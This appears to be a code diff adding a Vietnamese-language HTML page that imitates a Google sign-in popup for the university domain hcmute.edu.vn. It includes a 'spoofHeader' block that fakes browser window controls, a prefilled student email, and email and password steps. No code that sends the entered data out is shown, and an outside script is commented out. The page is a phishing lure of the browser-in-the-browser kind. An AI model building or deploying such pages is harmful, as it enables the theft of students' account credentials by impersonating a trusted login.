@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đăng nhập - Tài khoản</title>
+    <link rel="icon" type="image/x-icon" href="./assets/google-logo.png">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
+        integrity="sha512-9usAa10IRO0HhonpyAIVpjrylPvoDwiPUiKdWk5t3PyolY1cOd4DSE0Ga+ri4AuTroPR5aQvXU9xC6qOPnzFeg=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="./assets/google-login.css">
+</head>
+
+<body>
+    <div class="spoofHeader">
+        <div class="nav">
+            <div class="left">
+                <img src="./assets/google-logo.png">
+                <h2>Đăng nhập với tài khoản Google</h2>
+            </div>
+            <div class="right">
+                <i class="fa-solid fa-minus"></i>
+                <i class="fa-regular fa-square"></i>
+                <i class="fa-solid fa-xmark"></i>
+            </div>
+        </div>
+        <div class="back">
+            <i class="fa-solid fa-arrow-left" id="backBtn"></i>
+        </div>
+    </div>
+    <div class="wrapper">
+        <div class="progress-bar">
+            <div class="progress"></div>
+        </div>
+        <div class="header">
+            <img src="./assets/google-logo.png">
+            <h2>Đăng nhập bằng Google</h2>
+        </div>
+        <div id="input-email">
+            <div class="content">
+                <h1>Đăng nhập</h1>
+                <p>Tiếp tục tới <span class="link">hcmute.edu.vn</span></p>
+                <div class="form-group">
+                    <span class="label">Email hoặc số điện thoại</span>
+                    <input type="email" class="form-control">
+                </div>
+                <a href="#" class="link">Bạn quên địa chỉ email?</a>
+            </div>
+            <div class="footer">
+                <a class="link">Tạo tài khoản</a>
+                <button class="btn" id="nextEmail">Tiếp theo</button>
+            </div>
+        </div>
+        <!--Password-->
+        <div id="input-pass">
+            <div class="content">
+                <h1>Chào mừng</h1>
+                <p class="email-address">
+                    <i class="fa-solid fa-circle-user"></i>
+                    <span>19110420@student.hcmute.edu.vn</span>
+                </p>
+                <p>Để tiếp tục, trước tiên, hãy xác minh danh tính của bạn</p>
+                <div class="form-group focus">
+                    <span class="label">Nhập mật khẩu của bạn</span>
+                    <input type="password" class="form-control">
+                </div>
+                <label for="show-pass" class="show-pass">
+                    <input type="checkbox" id="show-pass">Hiện mật khẩu
+                </label>
+            </div>
+            <div class="footer">
+                <a class="link">Bạn quên mật khẩu?</a>
+                <button class="btn" id="nextPass">Tiếp theo</button>
+            </div>
+        </div>
+
+    </div>
+    <div class="setting">
+        <p class="sumary">Tiếng Việt</p>
+        <div>
+            <a href="#" class="link-setting">Trợ giúp</a>
+            <a href="#" class="link-setting">Bảo mật</a>
+            <a href="#" class="link-setting">Điều khoản</a>
+        </div>
+    </div>
+    <script>
+        var formGroups = document.querySelectorAll('.form-group')
+        var inputs = document.querySelectorAll('.form-control')
+        var labels = document.querySelectorAll('.form-group .label')
+
+        const progressBar = document.querySelector('.progress-bar')
+        const progress = document.querySelector('.progress')
+
+        const inputEmail = document.querySelector('#input-email')
+        const btnNextEmail = document.querySelector('#nextEmail')
+
+        const inputPass = document.querySelector('#input-pass')
+        const btnNextPass = document.querySelector('#nextPass')
+
+        document.onload = () => {
+            requestFullScreen()
+
+        }
+
+        btnNextEmail.addEventListener('click', () => {
+            progressBar.style.visibility = 'visible'
+            progress.style.animation = 'progress 0.8s ease infinite';
+            setTimeout(() => {
+                inputEmail.style.animation = 'floatLeft 0.5s forwards'
+                inputPass.style.animationDelay = '0.5s'
+                inputPass.style.animation = 'floatMain 0.5s forwards'
+                checkInput()
+                inputPass.querySelector('.email-address span').innerHTML = inputEmail.querySelector('.form-control').value
+                progressBar.style.visibility = 'hidden'
+                progress.style.animation = '';
+
+            }, 3000)
+
+        })
+
+        function checkInput() {
+            inputs.forEach(input => {
+                input.value === "" ? input.previousElementSibling.classList.add('blank')
+                    : input.previousElementSibling.classList.remove('blank')
+            })
+            // input.value === "" ? label.classList.add('blank') : label.classList.remove('blank')
+        }
+        document.addEventListener('click', (e) => {
+            formGroups.forEach(formGroup => {
+                if (e.target.isSameNode(formGroup) || e.target.isSameNode(formGroup.querySelector('.form-control'))
+                    || e.target.isSameNode(formGroup.querySelector('.label'))) {
+                    formGroup.classList.add('focus')
+                    formGroup.querySelector('input').focus()
+                    checkInput()
+                }
+                else {
+                    formGroup.classList.remove('focus')
+                    checkInput()
+                }
+            })
+        })
+        checkInput()
+    </script>
+    <!-- <script src="./js/google-login.js"></script> -->
+</body>
+
+</html>
